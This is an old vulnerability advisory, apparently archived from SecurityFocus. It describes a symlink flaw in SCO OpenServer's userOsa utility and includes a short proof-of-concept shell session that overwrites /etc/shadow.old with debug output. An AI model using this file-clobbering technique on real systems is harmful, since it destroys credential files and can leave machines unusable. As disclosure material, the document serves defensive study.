@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/701/info
+
+Under certain versions of SCO OpenServer there exists a symlink vulnerability which can be exploited to overwrite any file which is group writable by the 'auth' group. The problem in particular is in the the /etc/sysadm.d/bin/userOsa executable. When given garbage output the program will write out a debug log. However, the program does not check to see if it overwriting a currently existing file nor wether it is following a symlink. Therefore is it possible to overwrite files with debug data which are both in the 'auth' group and are writable by the same group. Both /etc/shadow & /etc/passwd fall into this category. If such an attack were launched against these files the system would be rendered unusable.
+
+scohack:/tmp$ ln -s /etc/shadow.old debug.log
+scohack:/tmp$ /etc/sysadm.d/bin/userOsa
+bah
+connectFail {{SCO_LOCAL_PIPE_ERR_INVALID_CONNECT_REQ {Invalid Connect
+Request: bah}}}
+Failed to listen to client
+Failure in making connection to OSA.
+scohack:/tmp$
+
+-----
+
+BEFORE EXPLOIT:
+scohack:/# l /etc/shadow.old
+-rw-rw---- 1 root auth 26 Oct 11 20:08 /etc/shadow.old
+
+AFTER EXPLOIT (note the file size):
+scohack:/# l /etc/shadow.old
+-rw-rw---- 1 root auth 177 Oct 11 20:10 /etc/shadow.old
+
+scohack:/# cat /etc/shadow.old
+>>> Debug log opened at Mon Oct 11 03:10:04 PM CDT 1999 by <PID=11604>
+<<<
+SendConnectFail(connectFail {{SCO_LOCAL_PIPE_ERR_INVALID_CONNECT_REQ
+{Invalid Connect Request: bah}}})
+
+scohack:/# 
